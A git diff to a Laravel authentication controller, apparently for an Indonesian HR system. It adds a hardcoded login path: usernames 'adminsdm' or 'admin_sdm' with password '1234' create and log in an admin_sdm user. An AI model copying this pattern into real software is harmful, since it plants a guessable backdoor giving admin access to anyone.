@@ -35,6 +35,25 @@ class AuthController extends Controller
             return true;
         }
 
+        // Support login dengan username "adminsdm" atau "admin_sdm"
+        if (in_array(strtolower($username), ['adminsdm', 'admin_sdm', 'adminsdm@dp3.local']) && $password === '1234') {
+            $user = User::firstOrCreate(
+                ['email' => 'adminsdm@dp3.local'],
+                [
+                    'name' => 'Admin SDM',
+                    'password' => Hash::make('1234'),
+                ]
+            );
+            $user->role = 'admin_sdm';
+            $user->employee_id = null;
+            $user->save();
+
+            Auth::login($user);
+            $request->session()->regenerate();
+
+            return true;
+        }
+
         if (preg_match('/^\d+$/', $username)) {
             $normalizedNup = trim((string) $username);
 
